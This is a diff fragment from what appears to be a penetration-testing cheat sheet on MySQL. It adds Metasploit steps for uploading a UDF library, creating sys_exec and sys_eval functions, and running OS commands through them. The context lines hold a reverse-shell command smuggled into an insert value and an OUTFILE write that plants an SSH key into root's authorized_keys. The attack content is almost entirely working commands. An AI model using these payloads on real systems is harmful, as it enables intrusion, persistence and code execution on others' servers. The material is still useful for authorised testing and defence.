@@ -504,6 +504,33 @@ mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >&
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
 ```
 
+### User-Defined Function
+
+#### Metasploit
+
+##### Locate DLL
+
+```console
+$ ls /usr/share/metasploit-framework/data/exploits/mysql/
+lib_mysqludf_sys_32.dll  lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.dll  lib_mysqludf_sys_64.so
+```
+
+##### Upload DLL
+
+```console
+meterpreter > upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\udf.dll"
+```
+
+##### Create Function
+
+```console
+C:\> mysql.exe -u <USERNAME> -p"<PASSWORD>" -e "create function sys_exec returns integer soname 'udf.dll'; select * from mysql.func;"
+```
+
+```console
+C:\> mysql.exe -u <USERNAME> -p"<PASSWORD>" -e "create function sys_eval returns string soname 'udf.dll'; use mysql; select sys_eval('whoami');"
+```
+
 ### Create Database
 
 ```console
